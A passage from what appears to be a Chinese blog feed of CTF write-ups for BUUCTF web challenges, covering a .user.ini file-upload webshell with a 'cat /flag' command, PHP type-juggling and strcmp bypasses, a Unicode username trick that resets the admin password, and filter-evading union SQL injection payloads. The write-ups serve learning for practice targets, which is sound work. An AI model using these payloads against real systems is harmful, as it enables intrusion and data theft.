  </entry>
  
  
  
  <entry>
    <title>BUU每日一题017</title>
    <link href="/2021/01/31/BUU017/"/>
    <url>/2021/01/31/BUU017/</url>
    
    <content type="html"><![CDATA[<h2 id="十七、"><a href="#十七、" class="headerlink" title="十七、"></a>十七、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[SUCTF 2019]CheckIn<br><img src="https://ftp.bmp.ovh/imgs/2021/01/cf0dc95dec9e9c82.png">   </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>文件上传<br>并且给了源码<code>https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</code>          </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// error_reporting(0);</span><span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"uploads/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$userdir</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"/index.php"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"upload"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"fileUpload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"fileUpload"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"filesize too big!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"filename cannot be empty!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//得到后缀</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/ph|htacess/i"</span><span class="token punctuation">,</span> <span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"illegal suffix!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//i区分了大小写</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"&lt;?"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&amp;lt;? in contents!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>                  <span class="token comment">//过滤&lt;?</span>    <span class="token variable">$image_type</span> <span class="token operator">=</span> <span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//判断图像类型</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$image_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"exif_imagetype:not image!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$upload_file_path</span> <span class="token operator">=</span> <span class="token variable">$userdir</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"/"</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$upload_file_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Your dir "</span> <span class="token punctuation">.</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span> <span class="token single-quoted-string string">' &lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Your files : &lt;br>'</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       </span></code></pre></code></pre><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>看别人wp知道需要上传个<code>.user.ini</code><br>然后在上传图片马<br><code>exif_imagetype</code>可以用文件头绕过<code>GIF89a</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/39c550bc2f0f01d7.png"><br><img src="https://ftp.bmp.ovh/imgs/2021/01/707658987a1ea540.png"><br>蚁剑连接，根目录下找到flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/643389a70dcab484.png"><br>或者<br>构造这样的马：<code>&lt;script language=&quot;php&quot;&gt;system(&#39;cat /flag&#39;);&lt;/script&gt; </code>直接访问<code>http://f07dace7-4865-447a-acdb-e7612afc49d7.node3.buuoj.cn/uploads/852aff287f54bca0ed7757a702913e50/index.php</code>即可得到flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/8b3db3af2203d029.png">     </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li><code>.user.ini</code>         <ul><li> php.ini是php默认的配置文件，其中包含有许多php的配置，这些配置又分为下面几种<img src="https://ftp.bmp.ovh/imgs/2021/01/e091aabefa65091e.png">        </li><li> <code>PHP_INI_USER</code>的配置项可以在<code>.user.ini</code>中设置  </li><li> <a href="https://www.php.net/manual/zh/ini.list.php">php.ini配置选项列表</a>        </li><li>其中有一个<code>auto_append_file</code> <img src="https://ftp.bmp.ovh/imgs/2021/01/5408d7feb83d1e15.png">意思就是可以让php文件执行前包含一个指定的文件         </li><li>修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载　               </li><li>利用条件：1.服务器脚本语言为PHP；2.上传的目录下要有可执行的php文件（如本题的index.php）3.服务器使用CGI/FastCGI模式</li></ul></li></ul><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题016</title>
    <link href="/2021/01/30/BUU016/"/>
    <url>/2021/01/30/BUU016/</url>
    
    <content type="html"><![CDATA[<h2 id="十六、"><a href="#十六、" class="headerlink" title="十六、"></a>十六、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[极客大挑战 2019]BuyFlag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/87d8cda4288f7a77.png">     </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>F12源代码注释中有东西              </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span>post money <span class="token keyword">and</span> password<span class="token operator">~</span><span class="token operator">~</span><span class="token operator">~</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"password can't be number&lt;/br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"Password Right!&lt;/br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>       </code></pre></code></pre><p>然后hackbar提交<code>password=404a&amp;&amp;money=100000000</code>没有任何回显，看wp说要抓包<br><img src="https://ftp.bmp.ovh/imgs/2021/01/0c41b9b77eda1d97.png"><br>把<code>user=0</code>改为<code>user=1</code>具体什么原因不清楚，看别人的wp，都说<code>ctfer的直觉</code>???????<br><img src="https://ftp.bmp.ovh/imgs/2021/01/4d7c3957f073e099.png"><br>提示太长，将<code>1000000000</code>改为科学计数法<code>1e9</code>得到flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/9ef31f33edb1070a.png">    </p><hr><ul><li>其他解法<br>strcmp漏洞<br>php版本&lt;5.3<br>比较字符串<br><code>strcmp( string $str1, string $str2) : int</code><br>如果 str1 小于 str2 返回 &lt; 0；如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0<br>当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。<br>这道题money用的strcmp函数是猜的<br>传入<code>money[]=1</code>得到flag<img src="https://ftp.bmp.ovh/imgs/2021/01/a17a95096707fae9.png"><br>is_numeric函数<br>在后面加<code>%20</code>可以绕过<img src="https://ftp.bmp.ovh/imgs/2021/01/879552bbb54de0aa.png">           </li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题015</title>
    <link href="/2021/01/29/BUU015/"/>
    <url>/2021/01/29/BUU015/</url>
    
    <content type="html"><![CDATA[<h2 id="十五、"><a href="#十五、" class="headerlink" title="十五、"></a>十五、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[ACTF2020 新生赛]BackupFile<img src="https://ftp.bmp.ovh/imgs/2021/01/6fd96c03122d1956.png">       </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>题目是backupfile<br><code>index.php.bak</code>得到一个文件，里面是源代码<br><img src="https://ftp.bmp.ovh/imgs/2021/01/ceb9dba5b69a2030.png"><br>intval函数–获取变量的整数值         </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>?key=123</code>得到flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/fe55316b8cee6109.png">     </p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li><code> backupfile-------index.php.bak</code>       </li><li>intval函数<br><img src="https://ftp.bmp.ovh/imgs/2021/01/d9f32c85b2b7167d.png"><br>Note:<br>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<br>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>将使用 10 进制 (decimal)。 </li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题014</title>
    <link href="/2021/01/28/BUU014/"/>
    <url>/2021/01/28/BUU014/</url>
    
    <content type="html"><![CDATA[<h2 id="十四、"><a href="#十四、" class="headerlink" title="十四、"></a>十四、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[HCTF 2018]admin       </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>F12<br><img src="https://img-blog.csdnimg.cn/20200517202809438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RNXzEwMjQ=,size_16,color_FFFFFF,t_70"><br>所以应该以admin登录，使用burp爆破密码，发现不行<br>网页还有注册功能，尝试注册admin，果然，已注册<br>那随便注册一个看看吧，<br>注册后网页还有修改密码的功能，打开，在F12中发现<img src="https://img-blog.csdnimg.cn/20200518084327983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1RNXzEwMjQ=,size_16,color_FFFFFF,t_70"><br>打开GitHub页面，应该是网页的源码了<img src="https://ftp.bmp.ovh/imgs/2021/01/4bbc351205f263bf.png"><br><code>hctf_flask/app/routes.py</code>这里找到各个模块的源码<br>python<br>flask<br>这一堆？？！！还是去看wp吧          </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>源码的主要内容<br><strong>注册模块：</strong>      </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> form<span class="token punctuation">.</span>verify_code<span class="token punctuation">.</span>data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Wrong verify code.'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span>        <span class="token keyword">if</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username <span class="token operator">=</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'The username has been registered'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'register successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'register'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span>         </code></pre></code></pre><p><strong>登录模块：</strong>          </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> name        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> <span class="token keyword">not</span> user<span class="token punctuation">.</span>check_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            flash<span class="token punctuation">(</span><span class="token string">'Invalid username or password'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        login_user<span class="token punctuation">(</span>user<span class="token punctuation">,</span> remember<span class="token operator">=</span>form<span class="token punctuation">.</span>remember_me<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'login'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span>        </code></pre></code></pre><p><strong>改密码模块：</strong>       </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>newpassword<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        flash<span class="token punctuation">(</span><span class="token string">'change successful'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'change.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'change'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span>      </code></pre></code></pre><p><strong>定义strlower：</strong>        </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>    <span class="token keyword">return</span> username      </code></pre></code></pre><p>登录有session<br>改密码还需要session验证用户<br>注册和修改密码都要经过一次strlower<br>nodeprep.prepare函数会将unicode字符<code>ᴬ</code>转换成<code>A</code>，而<code>A</code>在调用一次nodeprep.prepare函数会把<code>A</code>转换成<code>a</code><br><a href="https://unicode-table.com/en/blocks/phonetic-extensions/">unicode字符</a><br><img src="https://ftp.bmp.ovh/imgs/2021/01/51a248229b93b61a.png">         </p><p>所以可以用Unicode字符<code>ᴬᴰᴹᴵᴺ</code>注册，注册完成后会发现显示的是ADMIN,然后再修改一次密码，这样就把admin的密码重置了，然后登陆即可               </p><hr><p>这道题还有其他一些解法，但我有点理解不了<br><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581">MORE</a></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li><p>Unicode字符         </p><blockquote><p>Unicode 字符可以适用于所有已知的编码。Unicode 是继 ASCII（美国国家交互信息标准编码）字符码后的一种新字符编码，它为每一个符号定义一个数字和名称，并指定字符和它的数值（码位），以及该值的二进制位表示法，通过一个十六进制数字和前缀（U）定义一个16位的数值，如：U+0041 表示 A，其唯一的名称是 LATIN CAPITAL LETTER A.<a href="https://zhidao.baidu.com/question/6124060.html">MORE</a>          </p></blockquote></li><li><p>flask      </p><blockquote><p>Flask是一个使用 Python 编写的轻量级 Web 应用框架。<br>flask的session是存在客户端的         </p></blockquote></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题013</title>
    <link href="/2021/01/27/BUU013/"/>
    <url>/2021/01/27/BUU013/</url>
    
    <content type="html"><![CDATA[<h2 id="十三、"><a href="#十三、" class="headerlink" title="十三、"></a>十三、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[极客大挑战 2019]BabySQL<br><img src="https://ftp.bmp.ovh/imgs/2021/01/ba5c0550bde2d7d3.png">     </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>SQL注入<br><code>username=1&#39;      password=1</code>报错<br><code>username=1&#39;# password=1</code>没有报错，那应该就是单引号字符型了吧<br>然后<code>order by </code><img src="https://ftp.bmp.ovh/imgs/2021/01/2c23369b6aece50e.png"><br>只剩了<code>der</code>说明<code>or</code>被替换为空了，因为只会替换一次，所以双写即可绕过<code>oorrder by </code>然后发现<code>by</code>也被替换了，但返回显示的是<code>1#</code>前面的order不是绕过了么，怎么会没有了？？<br><code>oorrder bbyy</code>得到一共有三列<br>还有<code>select、from、where</code>也会被替换        </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p><code>username=1&amp;password=1&#39; ununionion selselectect 1,2,(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>得到所有库<img src="https://ftp.bmp.ovh/imgs/2021/01/6f07428aeecb4084.png"><br><code>username=1&amp;password=1&#39; ununionion selselectect 1,(seleselectct group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=&#39;ctf&#39;),(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>ctf下的表<img src="https://ftp.bmp.ovh/imgs/2021/01/faaaf5cf1ab77e21.png"><br><code>username=1&amp;password=1&#39; ununionion selselectect 1,(seleselectct group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name=&#39;Flag&#39;),(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>Flag下的列<img src="https://ftp.bmp.ovh/imgs/2021/01/a316535fcd86d177.png"><br><code>username=1;password=1&#39; ununionion selselectect 1,(seleselectct group_concat(flag) frfromom ctf.Flag),(selselectect group_concat(schema_name) frfromom infoorrmation_schema.schemata)#</code>得到flag<img src="https://ftp.bmp.ovh/imgs/2021/01/e332d6380e96f25e.png">    </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU每日一题012</title>
    <link href="/2021/01/26/BUU012/"/>
    <url>/2021/01/26/BUU012/</url>
    
